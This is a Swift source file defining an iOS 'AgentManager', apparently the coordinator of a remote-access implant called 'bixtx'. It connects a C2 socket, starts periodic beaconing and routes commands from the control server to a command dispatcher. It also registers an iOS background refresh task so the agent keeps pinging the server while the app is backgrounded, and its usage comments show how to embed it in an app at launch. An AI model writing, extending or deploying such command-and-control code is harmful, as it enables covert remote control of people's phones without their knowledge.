import Foundation
import BackgroundTasks

/// Top-level coordinator. Instantiate once from your AppDelegate or App struct.
///
/// Usage (AppDelegate):
///   let agent = AgentManager()
///   func application(_ application: UIApplication, didFinishLaunchingWithOptions ...) -> Bool {
///       agent.start()
///       return true
///   }
public final class AgentManager {
    private let socket:     C2Socket
    private let beacon:     Beacon
    private let dispatcher: CommandDispatcher

    // Background task identifier — must match Info.plist BGTaskSchedulerPermittedIdentifiers
    private let bgTaskId = "ai.bixtx.agent.refresh"

    public init() {
        socket     = C2Socket()
        beacon     = Beacon(socket: socket)
        dispatcher = CommandDispatcher(socket: socket, beacon: beacon)

        socket.onCommand = { [weak self] type, payload in
            self?.dispatcher.dispatch(type: type, payload: payload)
        }
        socket.onConnect = {
            print("[bixtx] C2 connected")
        }
        socket.onDisconnect = {
            print("[bixtx] C2 disconnected — will reconnect")
        }
    }

    // MARK: – Lifecycle

    public func start() {
        socket.connect()
        beacon.start()
        registerBackgroundTask()
    }

    public func stop() {
        beacon.stop()
        socket.disconnect()
    }

    // MARK: – iOS background execution

    /// Registers a BGAppRefreshTask so the agent can beacon even when backgrounded.
    /// Requires Info.plist: BGTaskSchedulerPermittedIdentifiers = ["ai.bixtx.agent.refresh"]
    /// and UIBackgroundModes = ["fetch", "remote-notification"]
    private func registerBackgroundTask() {
        BGTaskScheduler.shared.register(forTaskWithIdentifier: bgTaskId, using: nil) { [weak self] task in
            self?.handleBackgroundRefresh(task: task as! BGAppRefreshTask)
        }
        scheduleBackgroundRefresh()
    }

    private func scheduleBackgroundRefresh() {
        let req = BGAppRefreshTaskRequest(identifier: bgTaskId)
        req.earliestBeginDate = Date(timeIntervalSinceNow: Config.beaconInterval)
        try? BGTaskScheduler.shared.submit(req)
    }

    private func handleBackgroundRefresh(task: BGAppRefreshTask) {
        scheduleBackgroundRefresh() // reschedule immediately
        socket.send(type: "BACKGROUND_PING", payload: [:])
        task.setTaskCompleted(success: true)
    }
}
